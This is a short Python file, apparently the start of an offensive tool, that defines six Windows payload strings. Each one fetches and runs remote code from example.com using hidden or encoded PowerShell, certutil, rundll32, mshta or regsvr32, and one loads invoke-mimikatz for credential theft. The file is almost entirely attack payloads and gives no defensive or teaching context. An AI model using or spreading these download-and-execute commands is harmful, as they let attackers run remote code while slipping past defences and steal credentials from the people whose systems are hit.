```python
import os
import socket
import subprocess
import requests
import base64

payload1 = 'powershell -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString(\'http://example.com/shell.ps1\')"'
payload2 = 'certutil -urlcache -split -f http://example.com/malicious.exe C:\\temp\\malicious.exe && C:\\temp\\malicious.exe'
payload3 = 'powershell -nop -exec bypass -EncodedCommand ' + base64.b64encode('IEX (New-Object Net.WebClient).DownloadString(\'http://example.com/invoke-mimikatz.ps1\')'.encode('utf-16le')).decode()
payload4 = 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://example.com/exploit.sct")'
payload5 = 'mshta vbscript:Close(Execute("GetObject(""script:http://example.com/exploit.sct"")"))'
payload6 = 'regsvr32 /s /u /i:http://example.com/exploit.sct scrobj.dll'
```